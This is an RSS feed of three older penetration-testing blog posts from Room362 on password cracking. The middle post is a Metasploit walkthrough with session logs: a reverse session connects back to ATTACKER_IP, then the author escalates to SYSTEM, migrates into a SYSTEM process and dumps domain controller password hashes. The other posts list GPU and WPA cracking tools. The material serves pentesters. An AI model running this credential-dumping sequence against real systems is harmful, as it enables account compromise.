<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Password Cracking on Room362</title>
    <link>http://localhost:1313/tags/password-cracking/</link>
    <description>Recent content in Password Cracking on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Wed, 13 Jul 2011 14:02:13 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/password-cracking/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>GPU Cracking Complaints</title>
      <link>http://localhost:1313/post/2011/2011713gpu-cracking-complaints-html/</link>
      <pubDate>Wed, 13 Jul 2011 14:02:13 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2011/2011713gpu-cracking-complaints-html/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&amp;rsquo;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: I have very little crypto knowledge and even less GPU programming knowledge so I only get to complain as a user and not as someone who can actually fix the things I complain about.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Lack of LM support. I get that this is a complicated hashing algorithm, but the fact that 90% of companies still have it turned on and cracking any more than a few with Rainbow Tables is impractical unless you have a SSD raid with a GPU based cracker ($$$$$).&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Lack of dictionary support. Right now the best way to crack passwords is with oclhashcat-plus since it is GPU based and supports rules, multiple hashes (hash files) and directories of hashes. However, it has a very limited list of hashes it supports (No LM, SHA1, etc..) and it doesn&amp;rsquo;t support dump formats, so you need to strip the file so it just has the hash (this is more of just a bother than a gripe).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;(2a) I say &amp;lsquo;The best way&amp;rsquo; because anything that has a key space larger than upper-alpha-numeric-32symbol (LM) is just a bit nuts to try and brute force out of the gate unless your goal is to &amp;lsquo;crack them all&amp;rsquo;. Me as a pentester, I want to get as many as possible, as quick as possible, so this means dictionaries are the smarter option. (Maybe later I can do the straight brute if I really need / want to)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Lack of POT. For some reason every cracking app on the planet, save for JtR, thinks it&amp;rsquo;s a good idea to crack the same hash multiple times. I wish even Cain would keep a secret store of all the hashes it&amp;rsquo;s cracked stripped of anything unimportant (need the salt (username) sometimes) and store it in the background so that if it comes across the same hash it can say &amp;ldquo;oo oo I know this one&amp;rdquo; and auto populate it even before I start cracking. Why more cracking software writers don&amp;rsquo;t do this I&amp;rsquo;ll never know (would make their software seem a ton faster the more it is used)&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Lack of formatting documentation (#ripshairout). Rare is the time I&amp;rsquo;ve found a cracking program that shows you how it wants to consume a hash. JtR is the most egregious offenders of this but they all do it. One would think people would try and make it easy for people to use their software (give examples of what shit is supposed to look like at least if you don&amp;rsquo;t support standard formats)&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Those are my biggest gripes that the moment. If I am wrong on any account, let me know, I would love to know of a better way to do things.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
      <link>http://localhost:1313/post/2011/2011515dumping-hashes-on-win2k8-r2-x64-with-metasploit-html/</link>
      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2011/2011515dumping-hashes-on-win2k8-r2-x64-with-metasploit-html/</guid>
      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
+ -- --=[ 687 exploits - 364 auxiliary - 43 post
+ -- --=[ 217 payloads - 27 encoders - 8 nops
       =[ svn r12622 updated today (2011.05.15)

msf &amp;gt; 
[*] DC_IP:49220 Request received for /AYSBk...
[*] DC_IP:49220 Staging connection for target YSBk received...
[*] Patching Target ID YSBk into DLL
[*] DC_IP:49221 Request received for /BYSBk...
[*] DC_IP:49221 Stage connection for target YSBk received...
[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011

msf &amp;gt; sessions -i 7
[*] Starting interaction with 7...

meterpreter &amp;gt; sysinfo
System Language : en_US
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Computer        : DOMAINCONTROLLE
Architecture    : x64 (Current Process is WOW64)
Meterpreter     : x86/win32

meterpreter &amp;gt; ps

Process list
============

 PID   Name                                       Arch  Session  User                          Path
 ---   ----                                       ----  -------  ----                          ----
 0     [System Process]                                                                        
 4     System                                     x64   0                                      
 224   smss.exe                                   x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32smss.exe
 324   csrss.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32csrss.exe
 364   csrss.exe                                  x64   1        NT AUTHORITYSYSTEM           C:WindowsSystem32csrss.exe
 372   wininit.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wininit.exe
 404   winlogon.exe                               x64   1        NT AUTHORITYSYSTEM           C:WindowsSystem32winlogon.exe
 468   services.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32services.exe
 476   lsass.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32lsass.exe
 484   lsm.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32lsm.exe
 628   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
 708   svchost.exe                                x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe
 804   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
 836   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
 880   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
 932   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
 972   svchost.exe                                x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe
 328   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
 1172  spoolsv.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32spoolsv.exe
 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITYSYSTEM           C:WindowsADWSMicrosoft.ActiveDirectory.WebServices.exe
 1252  dfsrs.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dfsrs.exe
 1288  dns.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dns.exe
 1316  ismserv.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32ismserv.exe
 1360  svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
 1392  vmtoolsd.exe                               x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware Toolsvmtoolsd.exe
 1464  wlms.exe                                   x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wlmswlms.exe
 1492  dfssvc.exe                                 x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dfssvc.exe
 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware ToolsVMUpgradeHelper.exe
 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware ToolsTPAutoConnSvc.exe
 2016  vds.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32vds.exe
 872   sppsvc.exe                                 x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32sppsvc.exe
 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wbemWmiPrvSE.exe
 2360  taskhost.exe                               x64   1        SITTINGDUCKjuser             C:WindowsSystem32taskhost.exe
 2424  dwm.exe                                    x64   1        SITTINGDUCKjuser             C:WindowsSystem32dwm.exe
 2452  explorer.exe                               x64   1        SITTINGDUCKjuser             C:Windowsexplorer.exe
 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsTPAutoConnect.exe
 2512  conhost.exe                                x64   1        SITTINGDUCKjuser             C:WindowsSystem32conhost.exe
 2632  VMwareTray.exe                             x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsVMwareTray.exe
 2640  VMwareUser.exe                             x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsVMwareUser.exe
 2716  mmc.exe                                    x64   1        SITTINGDUCKjuser             C:WindowsSystem32mmc.exe
 3052  mscorsvw.exe                               x86   0        NT AUTHORITYSYSTEM           C:WindowsMicrosoft.NETFrameworkv4.0.30319mscorsvw.exe
 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITYSYSTEM           C:WindowsservicingTrustedInstaller.exe
 1932  mscorsvw.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsMicrosoft.NETFramework64v4.0.30319mscorsvw.exe
 2564  svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
 1732  msdtc.exe                                  x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32msdtc.exe
 2992  notepad.exe                                x86   1        SITTINGDUCKjuser             C:WindowsSysWOW64notepad.exe
 1720  notepad.exe                                x64   1        SITTINGDUCKjuser             C:WindowsSystem32notepad.exe


meterpreter &amp;gt; getpid
Current pid: 2992

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
============================================================
Enabled Process Privileges
============================================================
  SeDebugPrivilege
  SeIncreaseQuotaPrivilege
  SeMachineAccountPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeSystemProfilePrivilege
  SeSystemtimePrivilege
  SeProfileSingleProcessPrivilege
  SeIncreaseBasePriorityPrivilege
  SeCreatePagefilePrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeShutdownPrivilege
  SeSystemEnvironmentPrivilege
  SeChangeNotifyPrivilege
  SeRemoteShutdownPrivilege
  SeUndockPrivilege
  SeEnableDelegationPrivilege
  SeManageVolumePrivilege

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
...got system (via technique 1).

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
[*] Migrating to 1720...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  










meterpreter &amp;gt; hashdump 










[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
[*] Migrating to 1288...
[*] Migration completed successfully.

meterpreter &amp;gt; hashdump
Administrator:500:MYLMHASH:MYNTLMHASH:::
Guest:501:MYLMHASH:MYNTLMHASH:::
krbtgtG:502:MYLMHASH:MYNTLMHASH:::
Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
juserN:1104:MYLMHASH:MYNTLMHASH:::
jane.user??:1105:MYLMHASH:MYNTLMHASH:::
DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;

&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>GPU Hash / Password Cracking</title>
      <link>http://localhost:1313/post/2009/2009917gpu-hash-password-cracking-html/</link>
      <pubDate>Fri, 18 Sep 2009 01:44:39 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2009/2009917gpu-hash-password-cracking-html/</guid>
      <description>&lt;p&gt;I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won&amp;rsquo;t have as hard a time.&lt;/p&gt;

&lt;p&gt;Ivan Golubev&amp;rsquo;s SHA1/MD5/MD4 cracker: &lt;a href=&#34;http://www.golubev.com/hashgpu.htm&#34;&gt;&lt;br /&gt;
http://www.golubev.com/hashgpu.htm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ivan Golubev&amp;rsquo;s RAR pass cracker:&lt;br /&gt;
&lt;a href=&#34;http://www.golubev.com/rargpu.htm&#34;&gt;http://www.golubev.com/rargpu.htm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;CUDA Multiforcer (down at the time of this posting)&lt;br /&gt;
&lt;a href=&#34;http://www.cryptohaze.com/bruteforcers.php&#34;&gt;http://www.cryptohaze.com/bruteforcers.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BarsWF - MD5 Cracker:&lt;br /&gt;
&lt;a href=&#34;http://3.14.by/en/md5&#34;&gt;http://3.14.by/en/md5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;GPU MD5 Crack: (Included in BackTrack 4 repos &amp;ldquo;gpu-md5-crack&amp;rdquo;)&lt;br /&gt;
&lt;a href=&#34;http://bvernoux.free.fr/md5/index.php&#34;&gt;http://bvernoux.free.fr/md5/index.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Distributed Hash Cracker:&lt;br /&gt;
&lt;a href=&#34;http://rpisec.net/projects/show/hash-cracker&#34;&gt;http://rpisec.net/projects/show/hash-cracker&lt;/a&gt;&lt;br /&gt;
&amp;rdquo; This is an interesting one as it has a PHP front end and is agent based, so you can use one or a dozen computers, and it will use the CPUs and GPUs available&amp;rdquo;&lt;/p&gt;

&lt;p&gt;Pentoo Live CD with a bunch of GPU cracking goodness built in:&lt;br /&gt;
&lt;a href=&#34;http://pentoo.blogspot.com/&#34;&gt;http://pentoo.blogspot.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Extreme GPU Bruteforcer (39.95 Euro)&lt;br /&gt;
&lt;a href=&#34;http://www.insidepro.com/eng/egb.shtml&#34;&gt;http://www.insidepro.com/eng/egb.shtml&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ElcomSoft Distributed Password Recovery ($599 for 1st lvl - 20 hosts)&lt;br /&gt;
&lt;a href=&#34;http://www.elcomsoft.com/edpr.html&#34;&gt;http://www.elcomsoft.com/edpr.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ax0n from &lt;a href=&#34;http://www.h-i-r.net/&#34;&gt;http://www.h-i-r.net/&lt;/a&gt; shot me an email stating that BT4 has some more GPU tools added to it:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Just FYI, BT4 also added some CUDA GPU cracking functionality a while&lt;br /&gt;
back ago. IIRC It includes Pyrit and CUDA-Multiforcer &amp;ndash; maybe a few&lt;br /&gt;
others. Pyrit is a cuda-enabled WPA-PSK cracker that you may also be&lt;br /&gt;
interested in.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Pyrit - WPA/PSK - WPA2/PSK GPU cracker&lt;br /&gt;
&lt;a href=&#34;http://code.google.com/p/pyrit/&#34;&gt;http://code.google.com/p/pyrit/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>